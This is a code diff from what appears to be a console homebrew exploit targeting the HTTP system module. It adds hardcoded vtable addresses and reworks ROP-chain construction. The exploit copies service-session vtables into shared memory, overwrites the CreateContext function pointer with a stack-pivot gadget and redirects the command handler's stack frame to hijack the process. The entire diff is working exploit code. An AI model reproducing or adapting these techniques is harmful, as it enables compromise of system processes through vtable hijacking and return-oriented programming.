@@ -57,7 +57,11 @@ u32 ROP_SSLC_STATE = 0x00121674;//State addr used by HTTP-sysmodule for sslc.
 u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE = 0x0011b5dc;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the main service-session.
 u32 ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
 
+u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE = 0x0011b744;//Vtable for the object at *(_this+16), where _this is the one for httpc_cmdhandler. This is for the context-session.
+u32 ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE = 0x108;
+
 static u32 __custom_mainservsession_vtable = 0x0f000000 + 0xd00;
+static u32 __custom_contextservsession_vtable = 0x0f000000 + 0xd00 - 0x108;
 
 static u32 __httpmainthread_cmdhandler_stackframe = 0x0ffffe28;
 
@@ -380,11 +384,6 @@ Result init_hax_sharedmem(u32 *tmpbuf)
 	//Create sharedmem over the new_ropvmem page.
 	ropgen_sharedmem_create(&new_ropchain, &http_newropvaddr, ret2http_vaddr+0xc0, new_ropvmem, 0x1000, MEMPERM_READ | MEMPERM_WRITE, MEMPERM_READ | MEMPERM_WRITE);
 
-	//Setup the custom vtable used by setuphaxx_httpheap_sharedmem().
-	ropgen_memcpy(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE, ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
-	ropgen_setr0(&new_ropchain, &http_newropvaddr, ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC);
-	ropgen_strr0r1(&new_ropchain, &http_newropvaddr, __custom_mainservsession_vtable + 0x8, 1);//Overwrite the vtable funcptr for CreateContext.
-
 	//Setup the stack data which will be used once the above CreateContext vtable funcptr is used. This will stack-pivot to new_ropvmem.
 	
 	//The below commented block is actually for the context-session thread stack.
@@ -507,6 +506,8 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 
 	u32 ropheap = 0x0ffff000;//Main-thread stack-bottom.
 
+	u32 *ptr;
+
 	//Setup the ROP-chain used by the CreateContext vtable funcptr.
 
 	ropgen_strr0r1(&ropchain, &ropvaddr, ropheap+0x0, 1);//Due to the "mov r0, r4" done previously, r0 contains the cmdbuf ptr at this point. Save that ptr @ ropheap+0x0.
@@ -540,6 +541,15 @@ Result setuphaxx_httpheap_sharedmem(vu32 *httpheap_sharedmem, u32 httpheap_share
 	ropgen_writeu32(&ropchain, &ropvaddr, ROP_HTTPC_CMDHANDLER_RETURN, __httpmainthread_cmdhandler_stackframe-4, 1);
 
 	ropgen_stackpivot(&ropchain, &ropvaddr, __httpmainthread_cmdhandler_stackframe-4);
+
+	//Setup the custom vtable for main serv session.
+	ptr = (u32*)&ropvmem_sharedmem[(__custom_mainservsession_vtable - 0x0f000000) >> 2];
+	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_MAINSERVSESSION_OBJPTR_VTABLE_SIZE);
+	ptr[0x8>>2] = ROP_ADDSPx154_MOVR0R4_POPR4R5R6R7R8R9SLFPPC;//Overwrite the vtable funcptr for CreateContext.
+
+	//Setup the custom vtable for context-session.
+	ptr = (u32*)&ropvmem_sharedmem[(__custom_contextservsession_vtable - 0x0f000000) >> 2];
+	memcpy(ptr, &http_codebin_buf[ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE - 0x100000], ROP_HTTPC_CONTEXTSERVSESSION_OBJPTR_VTABLE_SIZE);
 
 	//Overwrite every vtable ptr with the target value with the custom one.
 
